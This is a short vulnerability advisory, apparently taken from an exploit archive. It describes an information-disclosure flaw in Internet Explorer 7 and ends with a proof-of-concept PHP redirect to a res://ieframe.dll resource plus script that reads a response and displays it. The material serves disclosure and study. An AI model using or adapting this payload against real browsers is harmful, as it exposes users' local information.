@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/28667/info
+
+Microsoft Internet Explorer is prone to an information-disclosure vulnerability.
+
+An attacker can exploit this issue to obtain potentially sensitive information from the local computer. Information obtained may aid in further attacks.
+
+This issue affects Internet Explorer 7. Reportedly, Internet Explorer 8 is not vulnerable, but this has not been confirmed.
+
+This issue may be related to the vulnerability discussed in BID 28581 (Microsoft Internet Explorer 'ieframe.dll' Script Injection Vulnerability).
+
+<?php header("location: res://ieframe.dll/24/123"); ?> <script> var xml = new XMLHttpRequest(); xml.open("GET","/the_header_file.php"); xml.onreadystatechange=function (){ if (xml.readyState == 4){ alert(xml.responseText) } } xml.send(null); </script> 
